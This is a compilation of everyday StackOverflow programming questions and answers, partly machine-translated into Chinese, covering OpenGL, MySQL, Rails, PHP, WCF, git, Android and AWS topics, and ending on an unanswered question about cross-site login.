# StackOverflow 问答 11935000-11935999

# opengl - relation from normalized device coordinate to screen coordinate?

> ID：11935005
> 
> 赞同：0
> 
> 时间：2012-08-13T13:15:18.193
> 
> 标签：opengl, screen, coordinate-systems, depth

I am confused in the relation between ndc to screen coordinate system. What i did was

1.  select screen coordinates (for example touch points on the screen).

2.  then pass the screen coordinates to gluUnproject. i set the depth variable(third variable of gluUnproject) to 0.0f.

3.  then i multiply the object coordinates to modelviewmatrix and projectionmatrix.

4.  after that I clipped the space. then i divide the clip space coordinate with W

5.  at last i scaled the ndc coordinates to screen coordinates.
6.  so the result was equal to coordinates which i first chose except Z coordinates. actually the result of Z was equal to -1.0f

after this I changed the gluUnproject`s third variable to 1.0f which i suppose the result was equal to 0.0f. But the result was 1.0f.

**So here is the question what is relation between normalized coordinate system and screen coordinate system. how do i set the depth variable of gluUnproject function?**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T14:02:36.787

> **归一化坐标系和屏幕坐标系有什么关系？**

标准化设备坐标在 [-1,+1] 范围内表示，并且是从剪辑空间坐标除以它们的 W 分量获得的。

它们通过视口参数和深度范围参数在窗口空间坐标中进行转换。

* * *

> **如何设置 gluUnproject 函数的深度变量？**

如果要将窗口空间坐标转换回标准化设备坐标，则需要在要转换的点处设置窗口空间 z 值。因此，直接从[OpenGL 常见问题解答](http://www.opengl.org/archives/resources/faq/technical/transformations.htm)：

```
GLdouble z;
glReadPixels (x, y, 1, 1, GL_DEPTH_COMPONENT, GL_DOUBLE, &z); 
```

*请注意，OpenGL 在深度缓冲区中存储非线性深度。*

# mysql - Capacity report in mysql

> ID：11935006
> 
> 赞同：0
> 
> 时间：2012-08-13T13:15:18.510
> 
> 标签：mysql

What is the best way to have the utilization data for the circuits in Database .For example If I have 100 circuits and utilization data of 6 columns for every month ,Is it good to have 1 table for evry month or increase the no of columns evry month

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T13:49:34.607

无论您的表结构是什么 - 每个月一张表都是非常糟糕的设计。而是将日期或月份字段添加到您的表中。

# ruby-on-rails - CarrierWave not overriding previous pages

> ID：11935014
> 
> 赞同：0
> 
> 时间：2012-08-13T13:15:48.077
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, ruby-on-rails-3.1, carrierwave

I am currently using carrierwave, and i am wondering if the following his possible. If so how!. Thanks in advance

I have a user and wants to upload an avatar then the following folder would be created

```
public/image/avatar/customer.id/image01/small
public/image/avatar/customer.id/image01/normal
public/image/avatar/customer.id/image01/big

public/image/avatar/customer.id/image02/small
public/image/avatar/customer.id/image02/normal
public/image/avatar/customer.id/image02/big 
```

Basically, I do not want to overide the previous image has i want to keep them, but create a folder for the newest picture to have it there. Also want the customer id has a path.

Thanks. PS: if its possible, please provide a tutorial or somesort, if not possible would paperclip allow it? Thanks i can't seem to find anything about it.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T12:50:47.247

**上传者/image_uploader.rb**

```
class ImageUploader < CarrierWave::Uploader::Base

# Include RMagick or MiniMagick support:
include CarrierWave::RMagick
# include CarrierWave::MiniMagick

# Choose what kind of storage to use for this uploader:
storage :file

# Override the directory where uploaded files will be stored.
# This is a sensible default for uploaders that are meant to be mounted:
  def store_dir
    "public/image/avatar/#{current_user.id}"
  end

  version :small do

  end

  version :normal do

  end

  version :big do

  end

end 
```

您的图像上传器应该看起来像这样。

# c++ - 接收 GPS (NMEA) 语句或 x,y 坐标并在地图上播放位置的开源 c++ 程序

> ID：11935017
> 
> 赞同：2
> 
> 时间：2012-08-13T13:15:56.163
> 
> 标签：c++, gps

我的程序从串口读取 GPS (NMEA) 语句。我希望能够在地图中看到这些句子（其中一些包含 x,y 坐标）中的位置。

有没有我可以使用的库（首选开源）？

（如果它可以在 Linux 和 Windows 上运行，它真的会帮助我，但如果不是，Windows 也可以）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T13:38:01.720

地图组件是用于系统集成还是仅用于诊断目的？如果仅出于诊断目的，将点加载到 Web GIS 解决方案（例如[Google Maps API](https://developers.google.com/maps/)或[Esri 的 ArcGIS Explorer](http://www.esri.com/software/arcgis/explorer)中）可能会更容易。ArcGIS Explorer 是独立的，但可以嵌入 Google 地图。使用 Google，您必须使用 JavaScript 来设计控件。

在 Java 世界中，[OpenMap](http://openmap.bbn.com/)很流行。

如果您需要开源 C++ 库，请考虑[OpenStreetMap](http://wiki.openstreetmap.org/wiki/Main_Page)。它是一个协作项目，为用户和开发人员提供地图绘制工具。特别是，查看[frameworks wiki](http://wiki.openstreetmap.org/wiki/Frameworks)以获取使用其框架的小部件和工具列表。我相信他们有你可以利用的 C++ 小部件（尽管我自己没有尝试过）。

对于 OSM，C++ 的小部件控件是[COSMCtrl](http://wiki.openstreetmap.org/wiki/COSMCtrl) (MFC)、[Marble](http://wiki.openstreetmap.org/wiki/Marble) (Qt) 和[QMapControl](http://www.medieninf.de/qmapcontrol/) (Qt)。

我确定那里还有其他开源 C++ 小部件，但我没有使用它们的经验。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:22:49.173

你试过这个：

[http://nmea.sourceforge.net/#platforms](http://nmea.sourceforge.net/#platforms)？

# iphone - 如何在方向上调整 UIWebView 内容大小？

> ID：11935022
> 
> 赞同：-1
> 
> 时间：2012-08-13T13:16:03.463
> 
> 标签：iphone, objective-c, ios, xcode, ipad

我的应用程序有一个 UIWebView，它包含一个 UIImageView 作为其子视图，当我更改设备的方向时，UIWebView 中的图像不受影响，并且它保持与以前相同的位置。那么有没有办法解决这个问题。我希望图像自动对齐到其各自的方向。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T13:34:30.243

如何使用“尺寸检查器”。如下设置，图像视图将移动到新位置。

![ss](../Images/257f44aa0fef6585c93d6315720757d4.png)

你能看到我在这张照片中做了什么吗？我删除了正方形周围的所有红线，以便视图移动以保持距离与屏幕边缘的比率。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:36:30.513

查看 autoresizingMask，它定义了在超级视图边界发生变化时视图的行为方式。在 Xcode 中，您可以在 Interface Builder/Size Inspector 中执行此操作。

# mysql - 使用多个表的结果查询数据库？

> ID：11935023
> 
> 赞同：1
> 
> 时间：2012-08-13T13:16:06.583
> 
> 标签：mysql

周围有一些类似的问题，但它们并不是我想要的，所以如果你认为这在其他地方得到了回答，请原谅我。

我基本上是在寻找一种简单的方法来做事，因为我有超过 4000 个表可以从中获取数据。这种继承自我之前的帖子：[mysql search for segment of table name](https://stackoverflow.com/questions/11931961/mysql-search-for-segment-of-table-name)

一般情况是我有一个充满表的数据库，我只想要大约四分之一的表，即大约 4000 个表。由于我以前的帖子，我有一个单独的表名列表，但我想要它们附带的数据。我知道对于个人我可以做 SELECT table1.*, table2.*; 或类似的东西，但我不想经历所有 4000 左右。它们都以相同的东西结尾，例如员工姓名、经理姓名、客户姓名，所以我可以使用

```
SHOW TABLES LIKE '%_name' 
```

在数据库中查看我想要的表名。有人建议使用动态mysql，但我什至不知道从哪里开始。有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:22:25.023

## 通用示例（在 PHP 中）：

借助编程语言构建动态 SQL 或构建 SQL 查询将如下所示（例如在 PHP 中）：

```
$pdos = $pdo->query("SHOW TABLES LIKE '%_name'");
$tables = $pdos->fetchAll();

$query = 'SELECT * FROM '.implode(' UNION SELECT * FROM ');
$pdo->query($query); 
```

该`fetchAll`方法将返回一个数组，其中包含每个选定表的名称。

该`implode($glue, $array)`函数采用一个数组并使用`$glue`参数连接数组中的每个值 - 通常您采用一个值数组并将它们内爆，`$glue = ','`以创建一个逗号分隔的值列表。

在我们的例子中，为了创建一个大查询，它`implode`有一个部分查询。`$glue``UNION JOIN`

一旦最终`$query`构建完成，它应该看起来像：

```
SELECT * FROM table_1_name
    UNION
SELECT * FROM table_2_name
    UNION
SELECT * FROM table_3_name
    ....
    ....
    UNION
SELECT * FROM table_4000_name 
```

结果应包含`DISTINCT`所有 4000 个表中的所有行。

## 具体示例（仅 SQL 格式）：

```
SELECT    GROUP_CONCAT(
              CONCAT('select * from ', table_name)
              SEPARATOR ' union '
          )
    INTO  @my_variable
    FROM  information_schema.tables
    WHERE table_schema = 'dbname'
    AND   table_name LIKE '%_name';

PREPARE   my_statement FROM @my_variable;
EXECUTE   my_statement; 
```

*   第一条语句将从`information_schema`数据库中获取所有表名；
*   该`CONCAT`函数在每个表名前加上一个`'SELECT * FROM '`字符串；
*   完成了在 PHP 中可以完成的`GROUP_CONCAT`工作；`implode`
*   该`INTO`子句确保将值保存在名为`my_variable`;的变量中。

*   该`PREPARE`语句接受一个字符串值（例如您保存在 中的那个`my_variable`）并检查该值是否为 SQL 查询；

*   该`EXECUTE`语句采用“准备好的语句”并且......执行它。

@my_variable 是一个临时变量，但它只能是标量类型（varchar、int、date、datetime、binary、float、double 等）它**不是**数组。

该`GROUP_CONCAT`函数是一个“聚合函数”，这意味着它接受一个聚合值（类似于数组的概念——在我们的例子中是查询的结果集）并输出一个简单的字符串结果。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T13:22:47.750

我建议生成 SQL 语句。

尝试做：

```
select concat('select * from ', table_name) as query
from Information_Schema.tables
where table_schema = <dbname> and
      table_name like <whatever> 
```

然后，您可以通过复制到查询编辑器窗口中将其作为一组查询运行。

如果您希望所有内容都作为一个查询，请执行以下操作：

```
select concat('select * from ', table_name, ' union all ') as query
from Information_Schema.tables
where table_schema = <dbname> and
      table_name like <whatever> 
```

并删除最后的“union all”。

这具有与like 匹配的表名。省略 WHERE 的 table_name 部分以获取所有表。或者，在 () 中使用 table_name 包含特定表。

# zend-framework - zf2控制器中的init方法

> ID：11935024
> 
> 赞同：6
> 
> 时间：2012-08-13T13:16:09.103
> 
> 标签：zend-framework, zend-framework2

在 Zendframework 1 中，我们使用`init()`方法来初始化控制器中的东西。我看到这是从zenframework 2中取出来的。为什么？以及在 zf 2 中实现相同目标的最佳方法是什么。我正在升级我以前在 zf1 中开发的项目，我可以看到 zf2 与 zf1 相比发生了很大变化。

zf2 中是否还有其他变化，我们使用其他方法（例如zf1 中的`preDispatch()`和`postDispatch()`）的方式？

有人经历过吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-13T22:22:42.400

In zf2 controllers are instantated by the ControllerLoader, which is a subclass of the ServiceManager. If you need to initalize a controller, either use a Factory, or `__construct`. Use `__construct` for simpile initalizations, and use a Factory if the controller consumes other objects that need to be injected.

`preDispatch` and `postDispatch` are also gone in favour of the new events system. To get the same result in zf2, register event handlers for the `disptach` and `render` events. For a full list of mvc envents see [http://akrabat.com/zend-framework-2/a-list-of-zf2-events/](http://akrabat.com/zend-framework-2/a-list-of-zf2-events/)

Also, take a look here for an example of setting up a controller factory [ZF2 how to get entity Manager from outside of controller](https://stackoverflow.com/questions/11866504/zf2-how-to-get-entity-manager-from-outside-of-controller)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-04-22T19:35:46.717

我认为您可以将其放入控制器中，它会起作用。

```
public function onDispatch(MvcEvent $e) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-01-11T19:32:32.867

由于 OP 提到`postDispatch`，值得注意的是`__destruct`现在以类似的方式工作。然而，一个很大的区别是不能阻止执行（例如通过`exit;`）来破坏对象。

# html - Div 在 ie8 中的 css 定位不正确

> ID：11935027
> 
> 赞同：1
> 
> 时间：2012-08-13T13:16:26.213
> 
> 标签：html, css

我有这个 div ..：

```
 <a href="/"><div id="logoCover" style="position: absolute;width: 341px;height: 100px;z-index: 9999;top: 0px;left: 0px;"></div></a> 
```

div 的问题在于，如果我给它一个背景色，它只会在 ie8 中显示。否则 div 将不存在，这意味着用户无法单击它.. 为什么这种行为在 ie8 中很常见，我该如何防止它

**更新：** 这是我尝试放置 div 的元素：

```
#logo {

    float: left;
    height: 93px;
    } 
```

徽标是图像

**完整的 HTML：**

```
<div id="logo" style="position:relaive;"> 
    <a href="/" style="position: absolute;padding:60px;padding-right: 300px;z-index: 9999;top:-20px;left: 0px;;display:block;" ></a>

      <img src="images/BestCam_logo.png" width="1009px" />
    </div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:27:44.673

`<div>`不支持将`<a>`标签作为标准 HTML 内标签的内容。一些浏览器试图适应这一点，但你真的不能依赖每个浏览器实现都以相同的方式处理它。

但是，您可以使`<a>`标签成为`block`元素（默认情况下它是`inline`元素）并将样式从`<div>`标签移动到`<a>`标签。这也将消除`<div>`您示例中对内部标签的需求。

`<a href="/" style="display: block; position: absolute;width: 341px;height: 100px;z-index: 9999;top: 0px;left: 0px;"></a>`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T14:02:48.657

```
 <div id="logo" style="position:relaive;"> 
        <a href="/" style="position: absolute;padding:60px;padding-right: 300px;z-index: 9999;top:-20px;left: 0px;;display:block;background-image: url('images/emptyImage.png')" ></a>

      <img src="images/BestCam_logo.png" width="1009px" />
    </div> 
```

解决了这个问题，我要做的是使用透明图像作为背景。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T13:19:08.740

尝试添加 display:block 或插入一个“”，检查您的相对 div 是否也正确呈现。

希望有帮助。

# php - php：如何捕获错误报告？

> ID：11935029
> 
> 赞同：1
> 
> 时间：2012-08-13T13:16:46.647
> 
> 标签：php

我正在开发一个由 ajax 请求调用的 php 脚本，它应该回显一些要解析的响应代码。

例如：

```
die('#1:200|Success|'.$data); 
```

或者另一个：

```
die('#0:100|Access Denied|'); 
```

现在，我还想包括在脚本执行期间可能发生的任何错误或警告 - 但附加在消息的末尾。

那么，将所有错误捕获到某个变量中的优雅方法是什么？

**编辑**

嗯，理解它的用途并不容易，手册在很多方面都不清楚。

但是好的，我会尝试举例说明我是如何理解它的，如果我弄错了，请指出:-)

```
//So guess first I off error reporting that would naturally occur.
error_reporting(0);

//Then I will define array to stuff the errors in.
$errors=array();

//Then I make my handler function.
function handler($errno,$errstr){
    global $errors;
    $errors[]=$errno.': '.$errstr;    //Stuff it into array.
}

//Then I define handler.
set_error_handler('handler',E_ALL); 
```

这是正确的用法吗？

它还说：

`The following error types cannot be handled with a user defined function: E_ERROR, E_PARSE, E_CORE_ERROR, E_CORE_WARNING, E_COMPILE_ERROR, E_COMPILE_WARNING, and most of E_STRICT raised in the file where set_error_handler() is called.`

还有一个问题，为什么它不能捕获严格的错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:34:19.820

我总是需要这个来在 ajaxing 时捕获错误：

```
header('content-type: application/json; charset=utf-8');
error_reporting(E_ALL);ob_start();

function error($msg,$do = false)
{
    //personal error message
    if(!isset($_SESSION))session_start();       
    trigger_error($msg."\n".(isset($_SESSION)?"[".$_SESSION['id']."|".$_SESSION['name']."]":"")."-----------");

    ob_clean(); 
    die(json_encode(array($msg,$do)));
}
function ob_error($msg = "Error!",$do = "ob_error")
{
    if($s = ob_get_clean())
    error("$msg\nDetails:\n$s",$do);
} 
```

用法：

```
//require the php above

//do something

//call error("acces denied") if there is an fatal error

//do anything else

//call ob_error() at the end: if there was anything outputted like warning/notice it will shown

//call die(json_encode(array(1, ...anything you need*...))); - this will run only if there was nothing displayed 
```

客户网站使用情况：

```
$.post('/_ajax/... .php',{
            'param1':...
            },function(a){
                if(a[0]=="1") //OK
                {                   
                    //* do something with a[n]                  
                }else{ //onError
                    alert(a[0]); 
                    //what to do client site after the error
                    if(a[1]=="refresh") 
                        location.href=location.href;
                }
            },"json").error(function() {alert("postError")); 
```

# c++ - 以单个字节表示浮点数

> ID：11935030
> 
> 赞同：7
> 
> 时间：2012-08-13T13:16:48.840
> 
> 标签：c++, floating-point

我有一种情况需要 a`float`以单个`char`. 这个 'minifloat' 需要表示的范围是 0 到 10e-7，所以我们总是可以假设数字为 +ve，指数为 -ve 以节省空间。

我考虑过的表示是 3 位指数和 5 位尾数（隐含 1 位），指数以 10 为底，即`x = man * 10^exp`.

要将浮点数转换为我的 minifloat，我计划使用`frexp`，并使用一些数学将基数 2 转换为基数 10。

这是一个明智的做法吗？还是有更好的方法来实现这一目标？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-13T13:29:02.330

您是否真的需要该值是浮点数（即随着值的缩放具有大致恒定的精度）？你打算如何处理这些值？

一个更简单（也更有效）的想法是将 8 位解释为隐含比例为 1e-7 的无符号定点数。IE：

```
float toFloat(uint8_t x) {
    return x / 255.0e7;
}

uint8_t fromFloat(float x) {
    if (x < 0) return 0;
    if (x > 1e-7) return 255;
    return 255.0e7 * x; // this truncates; add 0.5 to round instead
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-13T13:25:09.893

如果它符合您的目的，那么使用存储或传输格式等格式是合理的，即在小空间中记录数据。您应该验证这种格式的舍入误差对于您的需求来说不是太大，范围是否合适等等。

这不是一个好的计算格式，因为它在普通硬件上会很慢。

我不明白你会做什么基础转换。如果您在 a 中有一个 IEEE-754 浮点数`float`，那么转换为 8 位格式或从您的 8 位格式转换的工作是在转换为较窄格式时舍入有效数字（小数）和调整指数偏差，加上处理特殊情况（反规范、溢出、NaN）。这将只涉及二进制算术，而不是十进制。

顺便说一句，请注意浮点数的小数部分的正确术语是“小数”或“有效数”（IEEE-754 标准中使用的术语）。“尾数”是对数的小数部分。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-08-13T14:49:26.290

另一种方法是使用 256 个浮点（或双精度）的静态数组，您将根据自己的标准进行选择。

然后转换 unsigned char -> float/double 是微不足道的......

转换 float/double-> unsigned char 有点复杂（在静态数组中找到最近的浮点数）；与简单的二进制搜索算法进行大约 8 次比较，但根据您在静态数组中选择值的方式，您可能会发现更好。

当然，操作将使用本机浮点/双精度执行。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-13T13:33:43.677

5 个尾数位为您提供从 1.00 到 9.00 的 32 种不同情况，最小步长为 0.25

1.00 1.25 1.50 1.75 2.00 .... 8.75 9.00

3 个指数可以给你 8 种不同的情况 10^0（即 1） 10^-2 10^-3 10^-4 ....最后 10^-7

你的分数部分的误差是 0.25。如果您的计算可以补偿此错误，那么您可以使用它。

# iphone - 如何将另一个对象分配给指向单个对象？

> ID：11935031
> 
> 赞同：1
> 
> 时间：2012-08-13T13:16:54.543
> 
> 标签：iphone, objective-c, ios, memory-management

> **可能重复：**
> [NSString 不可变允许更改其值？](https://stackoverflow.com/questions/1805442/nsstring-immutable-allows-to-change-its-values)

如果我对一个对象进行更改，我想指向一个对象。相同的变化必须反映到其他对象。怎么做？

我做了一个样本，但它不起作用。

请检查一次代码。我的代码有什么错误？

```
-(void)viewDidLoad{ 
    str = [[NSString alloc] initWithString:@"Taruni"];   
    str2=str;  
    str2=@"Kalpana chawla";  
    [self changeStr:str];  
    NSLog(@"str = %@",str);
    [str release];  
    [str release];   
    [super viewDidLoad];    
}  
-(void)changeStr:(NSString *)x  
{   
    x=@"Chandra";  
} 
```

在.h文件中，我以这种方式声明

```
@property(nonatomic,assign) NSString *str;
@property(nonatomic,assign) NSString *str2; 
```

如果我更改 str2 的值，str 不会得到反映。

怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:32:49.153

试试下面的代码，

```
-(void)viewDidLoad{
    NSString *str = [[NSString alloc] initWithString:@"Taruni"];
    NSString **str2 = &str;
    *str2=@"Kalpana chawla";
    [self changeStr:&str];
    NSLog(@"str = %@",str);
    [str release];
    [str release];
    [super viewDidLoad];
}
-(void)changeStr:(NSString **)x
{
    *x=@"Chandra";
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:28:06.517

首先，如果你想改变一个字符串的内容，你需要 NSMutableString。其次，在您的 changeStr: 方法中，您什么也没做，只是将“x”指针分配给另一个字符串（并且 x 是本地的）。在方法中，您的指针“x”是本地的，而分配 (x = something) 不会反映在该方法之外。如果你想改变外部的东西，你将不得不使用 x.propertyName 或 [x methodName]。如果你想改变你的输入，它指向什么字符串，你需要输入:(NSString **)x，然后*x = @“Chandra”和[self changeStr:&str]。第三，你不能改变常量字符串（定义如下：@"constant string"），你必须使用 [NSString stringWithFormat:@"%@", str] （而不是 NSMutableString 为你的目的）

# javascript - 如何在 node.js 中从 mongodb 推送请求的数据

> ID：11935035
> 
> 赞同：0
> 
> 时间：2012-08-13T13:17:23.047
> 
> 标签：javascript, node.js, mongodb, express

我正在使用 Node.js、express、mongodb，并且卡在前端和后端之间传递的这些数据上。

注：以下代码为前后端通信的中间件代码

在这里，我通过使用成功地从前端获取了输入值`req.body.nr`

```
exports.find_user_post = function(req, res) {
    member = new memberModel();
    member.desc = req.body.nr;
    console.log(req.body.nr);
    member.save(function (err) {
        res.render('user.jade', );
    });
}; 
```

这就是问题所在，我需要使用我得到的输入值从我的数据库（后端的 mongodb）中找到正确的数据并推送到前端。

我的数据结构`{desc : ''}`， desc 对应于输入值，所以它应该看起来像这样`{desc: req.body.nr}`，这可能是不正确的代码？

```
exports.user = function(req, res){
    memberModel.find({desc: req.body.nr}, function(err, docs){
        res.render('user.jade', { members: docs });

    });
}; 
```

很想得到一些帮助。

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T09:41:48.227

看看来自 howtonode.org的这个很棒的[教程。](http://howtonode.org/express-mongodb)

因为如您所见，他使用了原型和函数回调：

* * *

在[文章provider-mongodb.js](http://howtonode.org/express-mongodb/articleprovider-mongodb.js)

```
ArticleProvider.prototype.findAll = function(callback) {
    this.getCollection(function(error, article_collection) {
      if( error ) callback(error)
      else {
        article_collection.find().toArray(function(error, results) {
          if( error ) callback(error)
          else callback(null, results)
        });
      }
    });
};

exports.ArticleProvider = ArticleProvider; 
```

* * *

在[app.js中](http://howtonode.org/express-mongodb/app.js)

```
app.get('/', function(req, res){
    articleProvider.findAll( function(error,docs){
        res.render('index.jade', { 
            locals: {
                title: 'Blog',
                articles:docs
            }
        });
    })
}); 
```

还要确保您从用户输入以及任何向 node.js 服务器发送数据的人中进行了一些错误检查。

PS：注意教程中使用的node、express和mongo驱动有点老。

# c# - 通过使用 NamedPipesBinding 的 WCF 服务获取 PipeException（管道正在关闭）

> ID：11935041
> 
> 赞同：6
> 
> 时间：2012-08-13T13:17:35.553
> 
> 标签：c#, .net, wcf, wcf-binding, wcf-client

我只是在学习 WCF，尝试不同的东西。

我设置了以下服务：

```
[ServiceBehavior(IncludeExceptionDetailInFaults = true , 
    InstanceContextMode = InstanceContextMode.Single)]
    public class TestService : ITestService
    {
        // This operation is defined as OneWay.
        public void Throws()
        {
            throw new ArgumentException();
        }
    } 
```

我像这样从我的客户那里使用它：

```
var baseAddress = new Uri("net.pipe://localhost/hello");

// Create the ServiceHost.
using (ServiceHost host = new ServiceHost(typeof(TestService), baseAddress))
{
    var netBinding = new NetNamedPipeBinding(NetNamedPipeSecurityMode.None);
    host.AddServiceEndpoint(typeof(ITestService), netBinding, baseAddress);
    host.Open();

    Console.WriteLine("The service is ready at {0}", baseAddress);

    // Create client channel.
    var channel = ChannelFactory<ITestService>.CreateChannel(netBinding, new EndpointAddress(baseAddress));

    ((ICommunicationObject)channel).Open();

    try
    {
        foreach (var i in Enumerable.Range(0, 5000))
        {
            // channel dies after a few attempts.
            channel.Throws();
        }
    } 
```

*Throws*方法定义为 IsOneWay = true，这意味着它不会将任何消息传播回客户端（包括错误）。

在循环中运行时，通信对象在运行一些之后会出现故障。我无法弄清楚造成这种情况的原因。

异常详情：

> System.ServiceModel.CommunicationException：写入管道时出错：管道正在关闭。(232, 0xe8)。---> System.IO.PipeException：写入管道时出错：管道正在关闭。(232, 0xe8)。在 System.ServiceModel.Channels.PipeConnection.StartSyncWrite(Byte[] buffer, Int32 offset, Int32 size, Object& holder) at System.ServiceModel.Channels.PipeConnection.Write(Byte[] buffer, Int32 offset, Int32 size, Boolean immediate, TimeSpan 超时，BufferManager bufferManager r) --- 内部异常堆栈跟踪结束 ---

请注意，如果我将 Throws 方法的主体更改为其他内容，例如 Console.WriteLine，则一切运行正常。

编辑：我已将示例项目上传到我的 SkyDrive：[http ://sdrv.ms/NumUbR](http://sdrv.ms/NumUbR)

如果有人想在本地编译它并查看它的行为是否相同。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T21:19:01.913

You are simply exceeding the available bandwidth at some point. It’s likely the pipe, but it might also be in the WCF stack… processing exceptions is expensive and you are doing 5000 of them in as tight a loop as possible. Changing from an exception to a `WriteLine()` that returns nothing fixes the problem because it dramatically reduces the required bandwidth/processing. (I do see you mentioned OneWay, but I don't think it changes much. Even if the exception isn't returned, it still has to be processed).

**Try changing InstanceContextMode to PerCall.** That's the standard setting for “high volume” services. It will relieve *some* of the congestion.

Also to address the comments, hosting the service like this is fine. The ServiceHost will manage its own threads.

# git - 尝试推送到远程分支时出现 git 错误

> ID：11935043
> 
> 赞同：41
> 
> 时间：2012-08-13T13:17:49.360
> 
> 标签：git, push

我已经从 git 克隆了存储库 A 的 master 分支，并创建了我自己的名为 Li 的分支。我前段时间做了一些改动，将本地李的内容推送到远程李。

现在我已经将一些更新从远程 master 拉到我的本地 master 分支，从本地 master 分支到本地 Li，我正在尝试将更新从本地 Li 推送到远程 Li。但是，当我尝试运行时：

```
git checkout Li
git push origin Li 
```

我收到以下错误：

```
error: failed to push some refs to 'git@github.com:anodejs/system.git'
hint: Updates were rejected because the tip of your current branch is behind
hint: its remote counterpart. Merge the remote changes (e.g. 'git pull')
hint: before pushing again.
hint: See the 'Note about fast-forwards' in 'git push --help' for details. 
```

请注意，我的本地 master 分支已更新（我调用了 git pull origin master）并合并到本地 Li 分支中。但是，我确实为本地 Li 添加了一个新文件，因此本地 Li 与本地 master 不同（但这应该没关系，对吧？）

谢谢，李

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2013-03-07T04:15:45.007

更新被拒绝，因为推送的分支提示位于其遥控器后面。

```
git config --global push.default current 
```

尝试上面的命令将当前分支设置为默认分支

```
git push 
```

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2012-08-13T13:36:55.067

用 查找差异`git fetch && git log Li..origin/Li`。我猜您`Li`自上次推送以来已经重新定位或以其他方式重新切割，但是该命令应该准确地告诉您远程中不在本地的内容。您可以使用三点语法找到其中任何一个（但不是两者）中的内容：`git log Li...origin/Li`.

如果差异是预期的，那么只需与`git merge origin/Li`然后合并`git push`。如果不需要更改，请使用 覆盖远程`git push -f origin Li`。仅当您想放弃遥控器的更改时才这样做。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-03-13T10:39:37.593

您可以强制将更改推送到远程地址，但它可以产生新的远程分支

```
git push subtree_remote_address.git `git subtree split --prefix=subtree_folder`:refs/heads/branch --force 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-08-23T09:36:34.097

git 分支 --set-upstream-to=origin/ master

如果您在“主”分支上遇到错误，请尝试以下命令：

git 分支 --set-upstream-to=origin/master

或者，一个捷径： git push -u origin master

# java - 带有 Eclipse 的 Android 中的“令牌 ID 的语法错误”

> ID：11935048
> 
> 赞同：-3
> 
> 时间：2012-08-13T13:18:15.827
> 
> 标签：java, android, eclipse

我在包map1中有一个这样的类：

```
import android.graphics.Bitmap;

public class Map {

    public Bitmap Structure;

    public String name;

    public Integer ID;
} 
```

在不同的项目中 a 具有以下代码：

```
public class dummy {
    map1.Map MM = new map1.Map();
    MM.ID = 5;//this line is a error: "Syntax error on token "ID", VariableDeclaratorId expected after this token"
} 
```

我检查了参考资料，一切正常（据我所知）
我有一个不同的，一切正常。我找不到任何显着差异，但我对日食很陌生。

为什么会发生这种情况，我如何使我的第二个项目工作？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-13T13:21:42.610

基本上，您的代码已损坏。这个说法：

```
MM.ID = 5; 
```

不在构造函数、方法或初始化程序中。它需要。例如，您可能希望将其放入构造函数中：

```
public class dummy {
    map1.Map MM = new map1.Map();

    public dummy() {
        MM.ID = 5;
    }
} 
```

我怀疑你的其他工人阶级*没有*这样的语法错误。

（除此之外，最好开始使用私有变量，避免与标准库类型（如 ）发生冲突`Map`，并遵循 Java 命名约定。）

# ruby - describe_spot_price_history 返回的可用区 [eu-west-1a] 无效

> ID：11935054
> 
> 赞同：2
> 
> 时间：2012-08-13T13:18:30.300
> 
> 标签：ruby, amazon-ec2, amazon-web-services

我正在使用 AWS Ruby SDK，并且与 describe_spot_price_history 返回的错误消息堆叠在一起。错误消息说：**无效的可用区：eu-west-1a**

此消息仅针对欧洲 (eu-west-1a...) 中的可用区域返回，而不针对 us-east 中的其他区域返回。你知道如何解决这个问题吗？谢谢 ！

这是我的红宝石脚本：

```
begin
  ec2 = AWS::EC2.new(
    :access_key_id => access_key,
    :secret_access_key => access_secret)

  response = ec2.client.describe_spot_price_history(
    :start_time => start_time,
    :end_time => end_time,
    :instance_types => instance_type,
    :product_descriptions => 'Linux/UNIX',
    :availability_zone => availability_zone
  )

  prices = Array.new(response.spot_price_history_set.map(&:spot_price))
  prices = prices.flatten.collect { |i| i.to_f }
  puts prices

rescue
  puts "Error: " + $!
  exit 1
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:59:00.593

只需将 ec2 端点参数添加到 EC2.new

```
 ec2 = AWS::EC2.new(
    :access_key_id => access_key,
    :secret_access_key => access_secret,
    :ec2_endpoint => 'ec2.eu-west-1.amazonaws.com') 
```

# php - 将用户名和密码发送到另一个站点

> ID：11935055
> 
> 赞同：0
> 
> 时间：2012-08-13T13:18:30.193
> 
> 标签：php, api, authentication, autologin

我想通过主站点上的一个登录页面连接两个网站。

